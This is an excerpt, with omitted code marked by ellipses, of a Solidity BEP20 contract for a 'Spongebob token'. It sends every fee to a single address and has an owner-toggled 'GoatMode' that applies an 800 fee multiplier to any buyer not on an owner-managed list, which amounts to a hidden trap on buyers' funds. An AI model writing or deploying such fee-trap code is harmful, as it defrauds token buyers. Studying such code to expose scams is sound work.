...
contract Spongebob is IBEP20, Auth {
    ...
    string constant _name = "Spongebob token";
    string constant _symbol = "SPB";
    ...
    bool public GoatMode = true;
    mapping (address => bool) public isGoated;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x60CEB7258B33B7B53BF3702047F6B1E85580BE81;
        teamFeeReceiver = 0x60CEB7258B33B7B53BF3702047F6B1E85580BE81;
        devFeeReceiver = 0x60CEB7258B33B7B53BF3702047F6B1E85580BE81;
    ...
    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        ...
        if(GoatMode && !isGoated[receiver] && !isSell){
            multiplier = 800;
        }
    ...
    function enable_nuisance(bool _status) public onlyOwner {
     ...
     function enable_Goat(bool _status) public onlyOwner {
        GoatMode = _status;
    }
    ...
    function manage_Goat(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isGoated[addresses[i]] = status;
        }
    }
